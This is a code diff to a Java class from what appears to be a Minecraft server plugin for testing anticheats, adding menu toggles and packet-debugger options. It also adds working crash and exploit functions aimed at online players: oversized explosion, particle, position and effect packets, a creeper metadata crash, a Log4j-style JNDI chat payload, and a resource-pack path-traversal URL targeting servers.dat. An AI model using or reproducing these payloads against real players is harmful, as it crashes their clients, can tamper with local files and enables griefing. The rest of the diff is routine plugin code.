@@ -4,13 +4,12 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
-import java.util.UUID;
 
+import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.World;
-import org.bukkit.block.Block;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
@@ -22,12 +21,40 @@ import com.github.retrooper.packetevents.event.PacketReceiveEvent;
 import com.viaversion.viaversion.api.Via;
 import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
 
-import fr.minuskube.netherboard.bukkit.BPlayerBoard;
+import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Main.Rebug;
 import net.md_5.bungee.api.chat.BaseComponent;
 import net.md_5.bungee.api.chat.ComponentBuilder;
 import net.md_5.bungee.api.chat.HoverEvent;
 import net.md_5.bungee.api.chat.TextComponent;
+import net.minecraft.server.v1_8_R3.BlockPosition;
+import net.minecraft.server.v1_8_R3.ChatComponentText;
+import net.minecraft.server.v1_8_R3.DataWatcher;
+import net.minecraft.server.v1_8_R3.EntityCreeper;
+import net.minecraft.server.v1_8_R3.EntityLiving;
+import net.minecraft.server.v1_8_R3.EntityPlayer;
+import net.minecraft.server.v1_8_R3.EnumParticle;
+import net.minecraft.server.v1_8_R3.IChatBaseComponent;
+import net.minecraft.server.v1_8_R3.MobEffect;
+import net.minecraft.server.v1_8_R3.Packet;
+import net.minecraft.server.v1_8_R3.PacketDataSerializer;
+import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
+import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
+import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
+import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
+import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
+import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
+import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
+import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
+import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
+import net.minecraft.server.v1_8_R3.PacketPlayOutNamedEntitySpawn;
+import net.minecraft.server.v1_8_R3.PacketPlayOutPlayerInfo;
+import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
+import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
+import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving;
+import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
+import net.minecraft.server.v1_8_R3.Vec3D;
+import net.minecraft.server.v1_8_R3.IChatBaseComponent.ChatSerializer;
 
 public class User 
 {
@@ -37,18 +64,17 @@ public class User
     private int protocol;
     
     // Player Settings
-    public boolean SentUpdatedCommand = false, Infinite_Blocks, InvSeed = false, CancelInteract = false, AutoCloseAntiCheatMenu, Hunger, Fire_Resistance, Damage_Resistance, Exterranl_Damage, Vanilla1_8FlyCheck, Vanilla1_9FlyCheck, NotifyFlyingKick1_8, NotifyFlyingKick1_9, PotionEffects, AutoRefillBlocks, AntiCheatKick, AllowMentions, ProximityPlayerHider, HideOnlinePlayers, AllowDirectMessages, ShowFlags, ShowPunishes, FallDamage;
+    public boolean Builder = false, SentUpdatedCommand = false, Infinite_Blocks, InvSeed = false, CancelInteract = false, AutoCloseAntiCheatMenu, Hunger, Fire_Resistance, Damage_Resistance, Exterranl_Damage, Vanilla1_8FlyCheck, Vanilla1_9FlyCheck, NotifyFlyingKick1_8, NotifyFlyingKick1_9, PotionEffects, AutoRefillBlocks, AntiCheatKick, AllowMentions, ProximityPlayerHider, HideOnlinePlayers, AllowDirectMessages, ShowFlags, ShowPunishes, ShowSetbacks, FallDamage;
     
     public org.bukkit.Location death_location;
-    public final Map<UUID, Long> joinTimeMap = new HashMap<UUID, Long>();
-    public final Map<Location, Block> BlockPlaced = new HashMap<Location, Block>();
     public String AntiCheat;
-    public Player CommandTarget; // TODO: Fix this not setting to null when it should or maybe should leave it!?
+    public Player CommandTarget; 
     public Map<String, Boolean> AlertsEnabled = new HashMap<>();
-    public int timer_balance = 0, UnReceivedBrand = 0, ShouldTeleportByBow = 0, preSend = 0, preReceive = 0, sendPacketCounts = 0, receivePacketCounts = 0, BrandSetCount = 0, ClicksPerSecond = 0, preCPS = 0, Yapper_Message_Count = 0,
+    public int  S08Pos = 0, UnReceivedBrand = 0, ShouldTeleportByBow = 0, preSend = 0, preReceive = 0, sendPacketCounts = 0, receivePacketCounts = 0, BrandSetCount = 0, ClicksPerSecond = 0, preCPS = 0, Yapper_Message_Count = 0,
     potionlevel = 1, potion_effect_seconds = 240;
     public double lastTickPosX = 0, lastTickPosY = 0, lastTickPosZ = 0;
-    public BPlayerBoard ScoreBoard = null;
+    public long timer_balance = 0;
+    public float yaw, pitch;
     
     public Player getPlayer ()
     {
@@ -62,7 +88,6 @@ public class User
     {
         setUser(this);
         AlertsEnabled.clear();
-        BlockPlaced.clear();
         this.AntiCheat = Rebug.getINSTANCE().getLoadedAntiCheatsFile().getString("default-anticheat");
         this.AntiCheat = PT.isStringNull(this.AntiCheat) ? "Vanilla" : this.AntiCheat;
         this.player = player;
@@ -87,6 +112,7 @@ public class User
 		this.AntiCheatKick = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("AntiCheat Kick");
 		this.ShowFlags = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Flags");
 		this.ShowPunishes = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Punishes");
+		this.ShowSetbacks = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Setbacks");
 		this.AllowDirectMessages = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Allow Direct Messages");
 		this.PotionEffects = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Allow Potion Effects");
 		this.AutoRefillBlocks = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Auto Refill Blocks Placed");
@@ -114,6 +140,7 @@ public class User
         this.SpectatePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Spectate");
         this.SteerVehiclePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Steer Vehicle");
         this.CustomPayLoadPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Custom PayLoad");
+        this.TabCompletePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Tab Complete");
 	}
 	
 	public Inventory getPotionsMenu ()
@@ -209,6 +236,10 @@ public class User
 					
 				case "exterranl damage":
 					text = ChatColor.AQUA + "Status: " + (Exterranl_Damage ? ChatColor.GREEN : ChatColor.DARK_RED) + Exterranl_Damage;
+					break;
+					
+				case "setbacks":
+					text = ChatColor.AQUA + "Status: " + (ShowSetbacks ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowSetbacks;
 					break;
 					
 				case "hunger":
@@ -319,12 +350,6 @@ public class User
 		}
     	return version;
     }
-	public long getJoinTime(UUID uuid) {
-        return joinTimeMap.getOrDefault(uuid, 0L);
-    }
-    public void setJoinTime(UUID uuid, long joinTime) {
-        joinTimeMap.put(uuid, joinTime);
-    }
 	public String getRegister() {
 		return register;
 	}
@@ -378,14 +403,13 @@ public class User
     public boolean AllowedToDebug = true;
     public boolean isPacketDebuggerEnabled ()
     {
-    	return AllowedToDebug && Rebug.PacketDebuggerPlayers.contains(getPlayer().getUniqueId());
+    	return AllowedToDebug && Rebug.PacketDebuggerPlayers.containsKey(getPlayer().getUniqueId());
     }
     // Packets
     public boolean FlyingPacket = true, PositionPacket = true, PositionLookPacket = true, LookPacket = true, ArmAnimationPacket = true, HeldItemSlotPacket = true, DiggingPacket = true,
     BlockPlacePacket = true, EntityActionPacket = true, CloseWindowPacket = true, ClickWindowPacket = true, SettingsPacket = true, AbilitiesPacket = true, KeepAlivePacket = true, TransactionPacket = true
     , StatusPacket = true,
-    SpectatePacket = true, SteerVehiclePacket = true, CustomPayLoadPacket = true;
-    public int debuggercounter = 1;
+    SpectatePacket = true, SteerVehiclePacket = true, CustomPayLoadPacket = true, TabCompletePacket = true;
     
     public Inventory getPacketDebuggerMenu ()
     {
@@ -525,6 +549,13 @@ public class User
     		itemMeta.setLore(lore);
     		item.setItemMeta(itemMeta);
     		inventory.setItem(17, item);
+    		
+    		item = Reset(TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
+    		itemMeta.setDisplayName((TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
+    		lore.add(ChatColor.GRAY + "Click to " + (!TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
+    		itemMeta.setLore(lore);
+    		item.setItemMeta(itemMeta);
+    		inventory.setItem(18, item);
     		
     		PacketDebuggerMenu = inventory;
     	}
@@ -890,7 +921,6 @@ public class User
 			lore.add(ChatColor.AQUA + "Status: " + (AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + AutoRefillBlocks);
 			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Block Refill");
 			lore.add(ChatColor.RESET + "for Scaffold Test Area");
-			lore.add(ChatColor.AQUA + "In Development!");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
 			inventory.setItem(7, item);
@@ -929,6 +959,15 @@ public class User
 			inventory.setItem(11, item);
 			
 			
+			item = Reset(Material.BANNER);
+			itemMeta.setDisplayName(ChatColor.ITALIC + "Setbacks");
+			lore.add(ChatColor.AQUA + "Status: " + (ShowSetbacks ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowSetbacks);
+			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat alerts for you were/would of been Setback");
+			itemMeta.setLore(lore);
+			item.setItemMeta(itemMeta);
+			inventory.setItem(12, item);
+			
+			
 			item = Reset(Material.ANVIL);
 			itemMeta.setDisplayName(ChatColor.ITALIC + "Kick");
 			lore.add(ChatColor.AQUA + "Status: " + (AntiCheatKick ? ChatColor.GREEN : ChatColor.DARK_RED) + AntiCheatKick);
@@ -936,7 +975,7 @@ public class User
 			lore.add(ChatColor.AQUA + "In Development!");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(12, item);
+			inventory.setItem(13, item);
 			
 			item = Reset(Material.EXP_BOTTLE);
 			itemMeta.setDisplayName(ChatColor.ITALIC + "Hide All Online Players");
@@ -944,7 +983,7 @@ public class User
 			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide/Unhide All Online Players");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(13, item);
+			inventory.setItem(14, item);
 			
 			item = Reset(Material.IRON_DOOR);
 			itemMeta.setDisplayName(ChatColor.ITALIC + "Proximity Player Hider");
@@ -952,7 +991,7 @@ public class User
 			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide players that are near you!");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(14, item);
+			inventory.setItem(15, item);
 			
 			item = Reset(Material.BOOK_AND_QUILL);
 			itemMeta.setDisplayName(ChatColor.ITALIC + "Direct Messages");
@@ -961,7 +1000,7 @@ public class User
 			lore.add(ChatColor.AQUA + "In Development!");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(15, item);
+			inventory.setItem(16, item);
 
 
 			item = Reset(Material.BED);
@@ -970,7 +1009,7 @@ public class User
 			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Closing AntiCheat Menu");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(16, item);
+			inventory.setItem(17, item);
 			
 			
 			item = Reset(Material.TNT);
@@ -999,7 +1038,7 @@ public class User
     	if (ExploitsMenu != null)
     	{
     		User user = Rebug.getUser(CommandTarget);
-    		item = getMadeItems("%user-info%", user);
+    		UpdateItemInMenu(CrashersMenu, 0, getMadeItems("%user-info%", user));
     	}
     	if (ExploitsMenu == null)
     	{
@@ -1098,11 +1137,12 @@ public class User
     
     public Inventory getSpawnEntityCrashers ()
     {
-    	if (CrashersMenu == null || this.player.getOpenInventory() != CrashersMenu)
-    		return null;
-    	
-    	
     	this.player.closeInventory();
+    	if (SpawnEntityCrashersMenu != null)
+    	{
+    		User user = Rebug.getUser(CommandTarget);
+    		UpdateItemInMenu(CrashersMenu, 1, getMadeItems("%user-info%", user));
+    	}
     	if (SpawnEntityCrashersMenu == null)
     	{
     		Inventory inventory = PT.createInventory(this.player, 9, ChatColor.RED + "Spawn Entity Crashers");
@@ -1114,6 +1154,11 @@ public class User
 			item.setItemMeta(itemMeta);
 			inventory.setItem(0, item);
 			
+			
+			User user = Rebug.getUser(CommandTarget);
+    		item = getMadeItems("%user-info%", user);
+			inventory.setItem(1, item);
+			
 			item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
 			itemMeta.setDisplayName(ChatColor.RED + "Creeper");
 			lore.add("Creeper Crash Exploit!");
@@ -1121,21 +1166,185 @@ public class User
 			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(1, item);
+			inventory.setItem(2, item);
 			
 			item = Reset(new ItemStack(Material.MOB_SPAWNER));
 			itemMeta.setDisplayName(ChatColor.RED + "Test");
 			lore.add("Test Crash Exploit!");
 			itemMeta.setLore(lore);
 			item.setItemMeta(itemMeta);
-			inventory.setItem(2, item);
+			inventory.setItem(3, item);
 			
 			SpawnEntityCrashersMenu = inventory;
     	}
     	
     	return SpawnEntityCrashersMenu;
     }
-    
+ // TODO Make Crash Using ChatColor strip
+ 	public String NullPointerString ()
+ 	{
+ 		return null;
+ 	}
+ 	private EntityLiving entity = null;
+    public void CrashPlayer (Player target, String mode)
+    {
+    	if (target == null || !target.isOnline()) return;
+    	
+    	entity = null;
+    	if (mode != null && mode.length() > 0)
+    	{
+    		final EntityPlayer px = PT.getEntityPlayer(target);
+    		if (mode.equalsIgnoreCase("creeper"))
+    		{
+    			entity = new EntityCreeper(px.world);
+    			final DataWatcher dw = new DataWatcher((net.minecraft.server.v1_8_R3.Entity) entity);
+                dw.a (18, (Object) Integer.MAX_VALUE);
+                Packet<?> packet_spawn;
+                packet_spawn = new PacketPlayOutSpawnEntityLiving((EntityLiving) entity);
+                px.playerConnection.sendPacket(packet_spawn);
+                Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getINSTANCE(), new Runnable()
+                {
+                    @Override
+                    public void run()
+                    {
+                        PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
+                        px.playerConnection.sendPacket(meta);
+                    }
+                }, 5L);
+    		}
+    		if (mode.equalsIgnoreCase("test"))
+    		{
+    		}
+    	}
+    }
+ 	public void CrashSendPacket (Player target, String mode, String spawncrashmode)
+ 	{
+ 		if (target == null || !target.isOnline()) 
+ 		{
+ 			sendMessage("Target was null!");
+ 			return;
+ 		}
+ 		sendMessage("Sending Crash...");
+ 		
+ 		if (mode.equalsIgnoreCase("Server")) // Test in dev
+ 		{
+ 			for (int i = 0; i < Integer.MAX_VALUE; i ++)
+ 			PT.SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
+ 			sendMessage("Trying Server Crasher!");
+ 			return;
+ 		}
+ 		if (mode.equalsIgnoreCase("Test"))
+ 		{
+ 			IChatBaseComponent chatTitle = ChatSerializer.a("{\"text\":\"\"}");
+			PacketPlayOutChat chat = new PacketPlayOutChat(chatTitle, (byte) 2);
+			PT.SendPacket(target, chat);
+ 			sendMessage("Tried crashing " + target.getName() + " with test");
+ 			return;
+ 		}
+ 		if (mode.equalsIgnoreCase("NumbWare"))
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
+ 				    new PacketDataSerializer(Unpooled.buffer())));
+ 		}
+ 		if (mode.equalsIgnoreCase("Explosion"))
+ 		{
+             PT.SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
+ 		}
+ 		if (mode.equalsIgnoreCase("Particle"))
+ 		{
+ 			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
+ 			
+             for (int i = 0; i < EnumParticle.values().length; i ++)
+             {
+                 PT.SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
+             }
+ 		}
+ 		if (mode.equalsIgnoreCase("GameState"))
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500))));
+ 		}
+ 		if (mode.equalsIgnoreCase("Log4j"))
+ 		{
+ 			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
+ 			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
+ 			PT.SendPacket(target, new PacketPlayOutChat (text, (byte) 1));
+ 		}
+ 		if (mode.equalsIgnoreCase("illegal Position"))
+ 		{
+ 			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
+ 			{
+ 				PT.SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
+ 			}
+ 		}
+ 		if (mode.equalsIgnoreCase("illegal Effect"))
+ 		{
+ 			for (int i = 0; i < Integer.MAX_VALUE; i++)
+ 				PT.SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
+ 			
+ 		}
+ 		if (mode.equalsIgnoreCase("SpawnEntity"))
+ 		{
+ 			CrashPlayer(target, spawncrashmode);
+ 			sendMessage("Tried using the " + mode + " " + spawncrashmode + " Crash Exploit on " + target.getName());
+ 			return;
+ 		}
+ 		if (mode.equalsIgnoreCase("ResourcePack"))
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
+ 		}
+ 		sendMessage("Tried using the " + mode + " Crash Exploit on " + target.getName());
+ 	}
+ 	public void ExploitSendPacket (Player target, String exploit)
+ 	{
+ 		if (target == null || !target.isOnline()) 
+ 		{
+ 			sendMessage("Target was null!");
+ 			return;
+ 		}
+ 		User user = Rebug.getUser(target);
+ 		if (user == null) 
+ 		{
+ 			sendMessage("Failed to get User from <" + target.getName() + ">");
+ 			return;
+ 		}
+ 		EntityPlayer px = PT.getEntityPlayer(target);
+ 		if (px == null) 
+ 		{
+ 			sendMessage("Failed to get EntityPlayer <" + target.getName() + ">");
+ 			return;
+ 		}
+ 		sendMessage("Sending Exploit...");
+ 		
+ 		if (exploit.equalsIgnoreCase("ResourcePack"))
+ 		{
+ 			target.setResourcePack("level://../servers.dat");
+ 		}
+ 		if (exploit.equalsIgnoreCase("force sleep"))
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutBed(px, new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+ 		}
+ 		if (exploit.equalsIgnoreCase("demo"))
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
+ 		}
+ 		if (exploit.equalsIgnoreCase("fake death")) 
+ 		{
+ 			PT.SendPacket(target, new PacketPlayOutEntityStatus(px, (byte) 3));
+ 		}
+ 		if (exploit.equalsIgnoreCase("Test"))
+ 		{
+ 			TeleportUtils.GenerateCrashLocation(target);
+ 		}
+ 		if (exploit.equalsIgnoreCase("Spawn Player"))
+ 		{
+ 			target.setNoDamageTicks(Integer.MAX_VALUE);
+ 			px.setInvisible(true);
+ 			PT.SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
+ 			PT.SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
+ 			PT.SendPacket(target, new PacketPlayOutNamedEntitySpawn(PT.getEntityHuman(target)));
+ 		}
+ 		sendMessage("Tried using the " + exploit + " Exploit on " + target.getName());
+ 	}
     public ItemStack getMadeItems (String ItemName, User user)
     {
     	ItemStack order = null;
@@ -1150,7 +1359,7 @@ public class User
 		case "%user-info%":
 			order = Reset(Material.BOOK_AND_QUILL);
 			itemMeta = order.getItemMeta();
-			itemMeta.setDisplayName(ChatColor.DARK_PURPLE + "User " + ChatColor.GRAY + user.getPlayer().getName());
+			itemMeta.setDisplayName(ChatColor.DARK_PURPLE + "User " + ChatColor.GRAY + user.getName());
 			lore.add("AntiCheat " + user.getColoredAntiCheat());
 			lore.add("Client Brand " + ChatColor.GRAY + user.getBrand());
 			lore.add("Version " + ChatColor.GRAY + PT.getPlayerVersion(user.getProtocol()) + " (" + PT.getPlayerVersion(user.getPlayer()) + ")");
@@ -1377,6 +1586,16 @@ public class User
 	    		item.setItemMeta(itemMeta);
 				return item;
 			}
+			if (itemName.equalsIgnoreCase("PacketPlayInTabComplete"))
+			{
+				TabCompletePacket =! TabCompletePacket;
+				item = Reset(TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
+	    		itemMeta.setDisplayName((TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
+	    		lore.add(ChatColor.GRAY + "Click to " + (!TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
+	    		itemMeta.setLore(lore);
+	    		item.setItemMeta(itemMeta);
+				return item;
+			}
 			
 			break;
 		
@@ -1407,41 +1626,6 @@ public class User
 			}
 			break;
 			
-		case "rebug settings":
-			if (itemName.equalsIgnoreCase("Per Player Alerts"))
-			{
-				Rebug.PrivatePerPlayerAlerts =! Rebug.PrivatePerPlayerAlerts;
-				item = Reset(Material.DROPPER);
-				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.PrivatePerPlayerAlerts ? ChatColor.GREEN : ChatColor.RED).toString() + "Per Player Alerts");
-				item.setItemMeta(itemMeta);
-				return item;
-			}
-			if (itemName.equalsIgnoreCase("Debug"))
-			{
-				Rebug.debug =! Rebug.debug;
-				item = Reset(Material.REDSTONE);
-				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debug ? ChatColor.GREEN : ChatColor.RED).toString()  + "Debug");
-				item.setItemMeta(itemMeta);
-				return item;
-			}
-			if (itemName.equalsIgnoreCase("Debug To Ops Only"))
-			{
-				Rebug.debugOpOnly =! Rebug.debugOpOnly;
-				item = Reset(Material.PAPER);
-				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debugOpOnly ? ChatColor.GREEN : ChatColor.RED).toString()+ "Debug To Ops Only");
-				item.setItemMeta(itemMeta);
-				return item;
-			}
-			if (itemName.equalsIgnoreCase("Kick on reload config"))
-			{
-				Rebug.KickOnReloadConfig =! Rebug.KickOnReloadConfig;
-				item = Reset(Material.PAPER);
-				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.KickOnReloadConfig ? ChatColor.GREEN : ChatColor.RED).toString() + "Kick on Reload Config");
-				item.setItemMeta(itemMeta);
-				return item;
-			}
-			break;
-
 		default:
 			break;
 		}
@@ -1458,11 +1642,14 @@ public class User
 	@SuppressWarnings("deprecation")
 	public void DebuggerChatMessage (PacketReceiveEvent e, String toDebug)
 	{
+		if (PT.isStringNull(toDebug)) return;
+		
+		int debuggercounter = Rebug.PacketDebuggerPlayers.get(getPlayer().getUniqueId());
 		TextComponent component = new TextComponent(ChatColor.BOLD.toString() + ChatColor.DARK_GRAY + "| " + ChatColor.RED + "DEBUGGER " + ChatColor.DARK_GRAY + ">> " + "[" + debuggercounter + "] " + e.getPacketName());
 		BaseComponent[] baseComponents = new ComponentBuilder(e.getPacketName() + ":\n\n" + toDebug).create();
 		HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, baseComponents);
 		component.setHoverEvent(hoverEvent);
 		getPlayer().spigot().sendMessage(component);
-		debuggercounter ++;
+		Rebug.PacketDebuggerPlayers.put(getPlayer().getUniqueId(), debuggercounter + 1);
 	}
 }
